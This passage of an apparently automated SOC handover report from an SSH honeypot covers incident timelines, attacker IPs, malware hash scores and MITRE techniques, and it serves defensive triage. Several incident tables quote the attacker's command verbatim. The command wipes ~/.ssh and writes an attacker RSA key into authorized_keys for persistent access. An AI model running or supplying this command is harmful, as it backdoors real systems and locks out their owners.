| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:31:39` | `cowrie.session.connect` |
| `2026-05-24 16:31:39` | `cowrie.client.version` |
| `2026-05-24 16:31:39` | `cowrie.client.kex` |
| `2026-05-24 16:31:40` | `cowrie.login.success` |
| `2026-05-24 16:31:40` | `cowrie.session.params` |
| `2026-05-24 16:31:40` | `cowrie.command.input` |
| `2026-05-24 16:31:40` | `cowrie.command.failed` |
| `2026-05-24 16:31:41` | `cowrie.log.closed` |
| `2026-05-24 16:31:41` | `cowrie.session.params` |
| `2026-05-24 16:31:41` | `cowrie.command.input` |
| `2026-05-24 16:31:41` | `cowrie.session.file_download` |
| `2026-05-24 16:31:41` | `cowrie.log.closed` |
| `2026-05-24 16:31:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.75[.]60` to AbuseIPDB if not already reported
- [ ] Block `103.183.75[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c30eacf25557

| Field | Detail |
|---|---|
| **Source IP** | `103.183.75[.]60` |
| **First Seen** | 2026-05-24 16:31 |
| **Last Seen** | 2026-05-24 16:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:31:44` | `cowrie.session.connect` |
| `2026-05-24 16:31:44` | `cowrie.client.version` |
| `2026-05-24 16:31:44` | `cowrie.client.kex` |
| `2026-05-24 16:31:45` | `cowrie.login.success` |
| `2026-05-24 16:31:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.75[.]60` to AbuseIPDB if not already reported
- [ ] Block `103.183.75[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4679bb920e5

| Field | Detail |
|---|---|
| **Source IP** | `101.126.89[.]144` |
| **First Seen** | 2026-05-24 16:42 |
| **Last Seen** | 2026-05-24 16:42 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:42:35` | `cowrie.session.connect` |
| `2026-05-24 16:42:35` | `cowrie.client.version` |
| `2026-05-24 16:42:35` | `cowrie.client.kex` |
| `2026-05-24 16:42:36` | `cowrie.login.success` |
| `2026-05-24 16:42:37` | `cowrie.session.params` |
| `2026-05-24 16:42:37` | `cowrie.command.input` |
| `2026-05-24 16:42:37` | `cowrie.command.failed` |
| `2026-05-24 16:42:38` | `cowrie.log.closed` |
| `2026-05-24 16:42:38` | `cowrie.session.params` |
| `2026-05-24 16:42:38` | `cowrie.command.input` |
| `2026-05-24 16:42:39` | `cowrie.session.file_download` |
| `2026-05-24 16:42:39` | `cowrie.log.closed` |
| `2026-05-24 16:42:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.89[.]144` to AbuseIPDB if not already reported
- [ ] Block `101.126.89[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b13e49ebae9

| Field | Detail |
|---|---|
| **Source IP** | `101.126.89[.]144` |
| **First Seen** | 2026-05-24 16:42 |
| **Last Seen** | 2026-05-24 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:42:44` | `cowrie.session.connect` |
| `2026-05-24 16:42:44` | `cowrie.client.version` |
| `2026-05-24 16:42:44` | `cowrie.client.kex` |
| `2026-05-24 16:42:46` | `cowrie.login.success` |
| `2026-05-24 16:42:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.89[.]144` to AbuseIPDB if not already reported
- [ ] Block `101.126.89[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4306cb86cf1

| Field | Detail |
|---|---|
| **Source IP** | `101.126.89[.]144` |
| **First Seen** | 2026-05-24 16:43 |
| **Last Seen** | 2026-05-24 16:43 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:43:07` | `cowrie.session.connect` |
| `2026-05-24 16:43:07` | `cowrie.client.version` |
| `2026-05-24 16:43:07` | `cowrie.client.kex` |
| `2026-05-24 16:43:10` | `cowrie.login.success` |
| `2026-05-24 16:43:10` | `cowrie.session.params` |
| `2026-05-24 16:43:10` | `cowrie.command.input` |
| `2026-05-24 16:43:10` | `cowrie.command.failed` |
| `2026-05-24 16:43:10` | `cowrie.log.closed` |
| `2026-05-24 16:43:11` | `cowrie.session.params` |
| `2026-05-24 16:43:11` | `cowrie.command.input` |
| `2026-05-24 16:43:12` | `cowrie.session.file_download` |
| `2026-05-24 16:43:12` | `cowrie.log.closed` |
| `2026-05-24 16:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.89[.]144` to AbuseIPDB if not already reported
- [ ] Block `101.126.89[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2f6b94058a7

| Field | Detail |
|---|---|
| **Source IP** | `101.126.89[.]144` |
| **First Seen** | 2026-05-24 16:43 |
| **Last Seen** | 2026-05-24 16:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:43:16` | `cowrie.session.connect` |
| `2026-05-24 16:43:16` | `cowrie.client.version` |
| `2026-05-24 16:43:17` | `cowrie.client.kex` |
| `2026-05-24 16:43:20` | `cowrie.login.success` |
| `2026-05-24 16:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.89[.]144` to AbuseIPDB if not already reported
- [ ] Block `101.126.89[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a350b4d8abd8

| Field | Detail |
|---|---|
| **Source IP** | `101.126.89[.]144` |
| **First Seen** | 2026-05-24 16:43 |
| **Last Seen** | 2026-05-24 16:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:43:41` | `cowrie.session.connect` |
| `2026-05-24 16:43:41` | `cowrie.client.version` |
| `2026-05-24 16:43:42` | `cowrie.client.kex` |
| `2026-05-24 16:43:43` | `cowrie.login.success` |
| `2026-05-24 16:43:45` | `cowrie.session.params` |
| `2026-05-24 16:43:45` | `cowrie.command.input` |
| `2026-05-24 16:43:45` | `cowrie.command.failed` |
| `2026-05-24 16:43:46` | `cowrie.log.closed` |
| `2026-05-24 16:43:46` | `cowrie.session.params` |
| `2026-05-24 16:43:46` | `cowrie.command.input` |
| `2026-05-24 16:43:47` | `cowrie.session.file_download` |
| `2026-05-24 16:43:47` | `cowrie.log.closed` |
| `2026-05-24 16:43:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.89[.]144` to AbuseIPDB if not already reported
- [ ] Block `101.126.89[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e061e55a541

| Field | Detail |
|---|---|
| **Source IP** | `101.126.89[.]144` |
| **First Seen** | 2026-05-24 16:43 |
| **Last Seen** | 2026-05-24 16:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:43:50` | `cowrie.session.connect` |
| `2026-05-24 16:43:50` | `cowrie.client.version` |
| `2026-05-24 16:43:51` | `cowrie.client.kex` |
| `2026-05-24 16:43:52` | `cowrie.login.success` |
| `2026-05-24 16:43:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.89[.]144` to AbuseIPDB if not already reported
- [ ] Block `101.126.89[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14c90dea0100

| Field | Detail |
|---|---|
| **Source IP** | `101.126.89[.]144` |
| **First Seen** | 2026-05-24 16:48 |
| **Last Seen** | 2026-05-24 16:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:48:37` | `cowrie.session.connect` |
| `2026-05-24 16:48:37` | `cowrie.client.version` |
| `2026-05-24 16:48:37` | `cowrie.client.kex` |
| `2026-05-24 16:48:40` | `cowrie.login.success` |
| `2026-05-24 16:48:41` | `cowrie.session.params` |
| `2026-05-24 16:48:41` | `cowrie.command.input` |
| `2026-05-24 16:48:41` | `cowrie.command.failed` |
| `2026-05-24 16:48:41` | `cowrie.log.closed` |
| `2026-05-24 16:48:42` | `cowrie.session.params` |
| `2026-05-24 16:48:42` | `cowrie.command.input` |
| `2026-05-24 16:48:42` | `cowrie.session.file_download` |
| `2026-05-24 16:48:42` | `cowrie.log.closed` |
| `2026-05-24 16:48:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.89[.]144` to AbuseIPDB if not already reported
- [ ] Block `101.126.89[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5b5aa561d52

| Field | Detail |
|---|---|
| **Source IP** | `101.126.89[.]144` |
| **First Seen** | 2026-05-24 16:48 |
| **Last Seen** | 2026-05-24 16:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:48:45` | `cowrie.session.connect` |
| `2026-05-24 16:48:45` | `cowrie.client.version` |
| `2026-05-24 16:48:46` | `cowrie.client.kex` |
| `2026-05-24 16:48:46` | `cowrie.login.success` |
| `2026-05-24 16:48:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.89[.]144` to AbuseIPDB if not already reported
- [ ] Block `101.126.89[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `185.136.207[.]84` | **24** | 2026-05-24 15:45 | 2026-05-24 16:04 | 48m | 0 | `T1592` | 🟠 MEDIUM |
| `166.62.88[.]46` | **21** | 2026-05-24 15:10 | 2026-05-24 17:02 | 10m | 0 | `T1592` | 🟠 MEDIUM |
| `101.126.89[.]144` | **15** | 2026-05-24 16:36 | 2026-05-24 16:48 | 2m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.56.11[.]2` | **15** | 2026-05-24 15:12 | 2026-05-24 16:27 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.23[.]159` | **12** | 2026-05-24 15:37 | 2026-05-24 16:00 | 4m | 9 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.78[.]222` | **11** | 2026-05-24 15:09 | 2026-05-24 15:58 | 16m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.122[.]186` | **10** | 2026-05-24 15:56 | 2026-05-24 16:30 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `40.112.183[.]29` | **5** | 2026-05-24 15:11 | 2026-05-24 15:34 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `45.148.120[.]187` | **4** | 2026-05-24 15:25 | 2026-05-24 16:45 | 2m | 0 | `T1592` | 🟢 LOW |
| `69.4.83[.]194` | **3** | 2026-05-24 15:55 | 2026-05-24 16:42 | 1m | 0 | `T1592` | 🟢 LOW |
| `103.183.75[.]60` | 1 | 2026-05-24 16:31 | 2026-05-24 16:31 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.18.2[.]75` | 1 | 2026-05-24 15:34 | 2026-05-24 15:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.172.180[.]124` | 1 | 2026-05-24 16:48 | 2026-05-24 16:48 | 27s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.43.76[.]120` | 1 | 2026-05-24 16:10 | 2026-05-24 16:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `200.194.181[.]113` | 1 | 2026-05-24 17:04 | 2026-05-24 17:04 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.204.160[.]114` | 1 | 2026-05-24 15:41 | 2026-05-24 15:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `40.83.182[.]122` | 1 | 2026-05-24 15:55 | 2026-05-24 15:55 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.106.90[.]118` | 1 | 2026-05-24 16:31 | 2026-05-24 16:32 | 60s | 1 | `T1110.001` | 🟢 LOW |
| `45.78.194[.]242` | 1 | 2026-05-24 16:17 | 2026-05-24 16:17 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.242.111[.]161` | 1 | 2026-05-24 15:42 | 2026-05-24 15:42 | 8s | 0 | `T1592` | 🟢 LOW |
| `47.86.3[.]155` | 1 | 2026-05-24 15:21 | 2026-05-24 15:21 | 8s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]105` | 1 | 2026-05-24 16:40 | 2026-05-24 16:40 | 15s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `119.18.2[.]75` | AU | Aussie Broadband | **100** ⚠️ | 0 |
| `172.172.180[.]124` | US | Microsoft Limited | **100** ⚠️ | 14 |
| `66.132.172[.]105` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `182.43.76[.]120` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 50 |
| `120.48.78[.]222` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 13 |
| `69.4.83[.]194` | US | B2 Net Solutions Inc. | **100** ⚠️ | 13 |
| `101.126.23[.]159` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 11 |
| `101.36.122[.]186` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `45.78.194[.]242` | SG | BYTEPLUS | **100** ⚠️ | 50 |
| `47.242.111[.]161` | HK | ALIBABA CLOUD - HK | **100** ⚠️ | 29 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 134 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 60 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 53 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 27 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 27 |

---

## 🔕 False Positive Summary (60 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 14 below threshold 25 | 6 |
| AbuseIPDB score 16 below threshold 25 | 20 |
| AbuseIPDB score 3 below threshold 25 | 14 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 16 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 245 cases |
| Tool 34  | Credential Extractor        | ✅ 113 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 35 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 60 filtered (24.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 53 priority case(s) shown individually · 22 recon entry/entries in table (10 group(s) consolidating 120 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
